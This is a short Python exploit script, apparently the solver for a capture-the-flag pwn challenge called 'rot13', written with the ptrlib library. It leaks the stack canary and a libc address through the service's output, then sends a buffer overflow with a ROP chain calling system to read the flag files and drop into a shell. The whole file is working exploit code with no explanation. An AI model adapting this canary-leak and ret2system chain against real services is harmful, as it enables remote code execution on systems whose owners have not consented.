from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9999"))

libc = ELF("libc.so.6")
#sock = Process("../distfiles/rot13")
sock = Socket(HOST, PORT)

# Leak canary and proc base
payload = bytes([i for i in range(0x80, 0x100)])
sock.sendlineafter("Text: ", payload)
sock.recvuntil("Result: ")
leak = sock.recvonce(0x80)
canary = u64(leak[-0x18:-0x10])
logger.info("canary = " + hex(canary))
libc.base = u64(leak[-0x68:-0x60]) - libc.symbol("_IO_2_1_stdout_")
addr_rop = u64(leak[-0x10:-0x8]) + 8

# Leak libc base
payload  = b"A" * 0x108
payload += p64(canary)
payload += b"A" * 8 # saved rbp
payload += flat([
    next(libc.gadget('ret;')),
    next(libc.gadget('pop rdi; ret;')),
    addr_rop + 8*4,
    libc.symbol("system")
], map=p64)
payload += b"cat /flag*.txt"
sock.sendlineafter("Text: ", payload)

# Win
sock.recvuntil("Text: ")
sock.shutdown("send")

sock.sh()
